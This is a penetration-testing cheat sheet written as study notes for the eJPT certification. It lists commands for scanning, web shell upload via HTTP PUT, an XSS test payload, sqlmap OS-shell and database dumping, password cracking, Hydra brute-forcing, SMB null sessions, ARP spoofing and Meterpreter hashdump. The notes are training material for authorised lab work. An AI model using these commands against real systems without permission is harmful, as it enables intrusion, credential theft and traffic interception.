## eJPT Notes
**This will guide you through all the tools which will be helpful for your preparation and the exam. Make sure to replace the ip addresses and port numbers when you use it**

------------
**Routing**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ip route add ROUTETO via ROUTEFROM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

------------



**whois**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
whois site.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

------------



**Ping Sweep**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
fping -a -g 10.10.10.0/24 2>/dev/null
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sn 10.10.10.0/24
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


------------


**Nmap Scans**
**OS Detection**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -Pn -O -T4 10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Nmap Scan (Quick)**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sC -sV -T4 10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Nmap Scan (Full)**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sC -sV -T4 -p- 10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Nmap Scan (UDP Quick)**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sU -sV -T4 10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

------------


**Banner Grabbing**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**OpenSSL for HTTPS services**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Httprint**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
httprint -P0 -h 10.10.10.10 -s /path/to/signaturefile.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**HTTP Verbs**
GET, POST, HEAD, PUT, DELETE, OPTIONS
Use the OPTIONS verb to see what other verbs are available
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc 10.10.10.10 80
OPTIONS / HTPP/1.0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can use HTTP verbs to upload a php shell. Find the content length, then use PUT to upload the shell. Make sure you include the size of the payload when using the PUT command.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wc -m shell.php
x shell.php


PUT /shell.php
Content-type: text/html
Content-length: x
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

------------


**Directory and File Scanning**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dirsearch.py -u http://10.10.10.10 -e *
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gobuster -u 10.10.10.10 -w /path/to/wordlist.txt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dirb http://10.10.10.10/ -u username:pass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

------------



**Advanced Google Searches**
`site:`
`intitle:`
`inurl:`
`filetype:`
`AND, OR, &, |, -`

------------


**Cross Site Scripting (XSS)**
Steps:
1. Find a reflection point
2. Test with `<i>` tag
3. Test with HTML/JavaScript code
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<script>alert(1)</script>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
**Reflected XSS:**
Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload
**Persistent XSS:**
Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post

------------


**SQLMap**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sqlmap -u http://10.10.10.10 -p parameter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sqlmap -u http://10.10.10.10 --os-shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sqlmap -u http://10.10.10.10 --dump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


------------

**Password Attacks**
Unshadow
This prepares a file for use with John the Ripper

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
unshadow passwd shadow > unshadow
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


**Hash Cracking**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
john -wordlist /path/to/wordlist -users=users.txt hashfile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


------------


**Network Attacks**
**Brute Forcing with Hydra**
replace ‘ssh’ with any relevant service

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hydra -L users.txt -P pass.txt telnet://10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


------------


**Windows Shares Using Null sessions**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmblookup -A 10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**List shares**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient -L //10.10.10.10 -N
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Mount share:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
smbclient //10.10.10.10/share -N
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
enum4linux -a 10.10.10.10
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


------------


**ARP spoofing**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo 1 > /proc/sys/net/ipv4/ip_forward
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

------------



**Metasploit**
Basic Metasploit Commands

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
search x
use x
info
show options, show advanced options
SET X (e.g. set RHOST 10.10.10.10, set payload x)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


**Meterpreter**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
background

sessions -l

sessions -i 1

sysinfo, ifconfig, route, getuid

getsystem (privesc)

bypassuac

download x /root/

upload x C:\\Windows

shell

use post/windows/gather/hashdump
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


